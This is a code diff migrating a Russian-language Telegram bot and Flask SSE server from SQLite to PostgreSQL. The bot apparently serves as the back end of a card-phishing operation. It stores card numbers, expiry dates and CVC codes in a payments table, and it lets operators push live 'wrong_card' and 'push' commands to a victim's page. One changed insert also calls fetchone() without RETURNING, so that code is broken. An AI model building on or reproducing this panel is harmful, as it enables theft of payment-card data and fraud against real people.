@@ -8,7 +8,7 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-import sqlite3
+import psycopg2
 import datetime
 import json
 import time
@@ -84,7 +84,7 @@ def sse(user_id):
                             command = sse_clients[user_id].pop(0)
                             yield f"data: {json.dumps(command)}\n\n"
                 
-                time.sleep(0.5)
+                time.sleep(0.05)  # УСКОРЕНО С 0.5 ДО 0.05
                 
         except GeneratorExit:
             with sse_lock:
@@ -183,13 +183,19 @@ def run_flask():
 flask_thread = threading.Thread(target=run_flask, daemon=True)
 flask_thread.start()
 
-# База данных
+# ========== POSTGRESQL БАЗА ДАННЫХ ==========
+def get_db_connection():
+    """Подключение к PostgreSQL"""
+    return psycopg2.connect(os.getenv('DATABASE_URL'))
+
 def init_db():
-    conn = sqlite3.connect('applications.db')
+    """Создание таблиц в PostgreSQL"""
+    conn = get_db_connection()
     cursor = conn.cursor()
+    
     cursor.execute('''
     CREATE TABLE IF NOT EXISTS applications (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        id SERIAL PRIMARY KEY,
         user_id INTEGER,
         username TEXT,
         first_name TEXT,
@@ -199,9 +205,10 @@ def init_db():
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
     )
     ''')
+    
     cursor.execute('''
     CREATE TABLE IF NOT EXISTS payments (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        id SERIAL PRIMARY KEY,
         user_id INTEGER,
         first_name TEXT,
         last_name TEXT,
@@ -215,6 +222,7 @@ def init_db():
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
     )
     ''')
+    
     conn.commit()
     conn.close()
 
@@ -287,40 +295,34 @@ back_kb = InlineKeyboardMarkup(inline_keyboard=[
     [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
 ])
 
+# ========== POSTGRESQL ФУНКЦИИ ==========
 def get_user_status(user_id):
-    conn = sqlite3.connect('applications.db')
+    conn = get_db_connection()
     cursor = conn.cursor()
-    cursor.execute('SELECT status FROM applications WHERE user_id = ? ORDER BY id DESC LIMIT 1', (user_id,))
+    cursor.execute('SELECT status FROM applications WHERE user_id = %s ORDER BY id DESC LIMIT 1', (user_id,))
     result = cursor.fetchone()
     conn.close()
     return result[0] if result else None
 
 def get_join_date(user_id):
-    conn = sqlite3.connect('applications.db')
+    conn = get_db_connection()
     cursor = conn.cursor()
-    cursor.execute('SELECT created_at FROM applications WHERE user_id = ? AND status = "accepted"', (user_id,))
+    cursor.execute('SELECT created_at FROM applications WHERE user_id = %s AND status = %s', (user_id, 'accepted'))
     result = cursor.fetchone()
     conn.close()
     if result:
-        if isinstance(result[0], str):
-            try:
-                join_date = datetime.datetime.strptime(result[0], '%Y-%m-%d %H:%M:%S')
-                return join_date.strftime('%d.%m.%Y')
-            except ValueError:
-                return result[0]
-        elif isinstance(result[0], datetime.datetime):
-            return result[0].strftime('%d.%m.%Y')
+        return result[0].strftime('%d.%m.%Y')
     return datetime.datetime.now().strftime('%d.%m.%Y')
 
 def save_payment(user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc):
     try:
-        conn = sqlite3.connect('applications.db')
+        conn = get_db_connection()
         cursor = conn.cursor()
         cursor.execute('''
         INSERT INTO payments (user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc, amount)
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+        VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s) RETURNING id
         ''', (user_id, first_name, last_name, email, phone, card_number, card_expiry, cvc, 0.0))
-        payment_id = cursor.lastrowid
+        payment_id = cursor.fetchone()[0]
         conn.commit()
         conn.close()
         return payment_id
@@ -447,8 +449,8 @@ async def push_handler(callback: types.CallbackQuery):
 @dp.callback_query(F.data.startswith("wrong_card_"))
 async def wrong_card_handler(callback: types.CallbackQuery):
     parts = callback.data.split("_")
-    payment_id = parts[1]  # ← ИСПРАВЛЕНО
-    user_id = parts[2]     # ← ИСПРАВЛЕНО
+    payment_id = parts[1]
+    user_id = parts[2]
     
     success = await send_sse_command(user_id, "wrong_card", payment_id)
     
@@ -616,11 +618,11 @@ async def process_confirmation(message: types.Message, state: FSMContext):
         user_data = await state.get_data()
 
         try:
-            conn = sqlite3.connect('applications.db')
+            conn = get_db_connection()
             cursor = conn.cursor()
             cursor.execute('''
             INSERT INTO applications (user_id, username, first_name, time, experience, status)
-            VALUES (?, ?, ?, ?, ?, 'pending')
+            VALUES (%s, %s, %s, %s, %s, 'pending')
             ''', (
                 message.from_user.id,
                 message.from_user.username,
@@ -628,7 +630,7 @@ async def process_confirmation(message: types.Message, state: FSMContext):
                 user_data['time'],
                 user_data['experience']
             ))
-            application_id = cursor.lastrowid
+            application_id = cursor.fetchone()[0]
             conn.commit()
             conn.close()
         except Exception as e:
@@ -769,12 +771,12 @@ async def back_to_main(callback: types.CallbackQuery):
 async def accept_application(callback: types.CallbackQuery):
     application_id = callback.data.split("_")[1]
 
-    conn = sqlite3.connect('applications.db')
+    conn = get_db_connection()
     cursor = conn.cursor()
-    cursor.execute('UPDATE applications SET status = "accepted" WHERE id = ?', (application_id,))
+    cursor.execute('UPDATE applications SET status = %s WHERE id = %s', ('accepted', application_id))
     conn.commit()
 
-    cursor.execute('SELECT user_id, time, experience FROM applications WHERE id = ?', (application_id,))
+    cursor.execute('SELECT user_id, time, experience FROM applications WHERE id = %s', (application_id,))
     application = cursor.fetchone()
     conn.close()
 
@@ -820,12 +822,12 @@ async def accept_application(callback: types.CallbackQuery):
 async def reject_application(callback: types.CallbackQuery):
     application_id = callback.data.split("_")[1]
 
-    conn = sqlite3.connect('applications.db')
+    conn = get_db_connection()
     cursor = conn.cursor()
-    cursor.execute('UPDATE applications SET status = "rejected" WHERE id = ?', (application_id,))
+    cursor.execute('UPDATE applications SET status = %s WHERE id = %s', ('rejected', application_id))
     conn.commit()
 
-    cursor.execute('SELECT user_id FROM applications WHERE id = ?', (application_id,))
+    cursor.execute('SELECT user_id FROM applications WHERE id = %s', (application_id,))
     application = cursor.fetchone()
     conn.close()
 
@@ -864,7 +866,3 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-
-
-
-
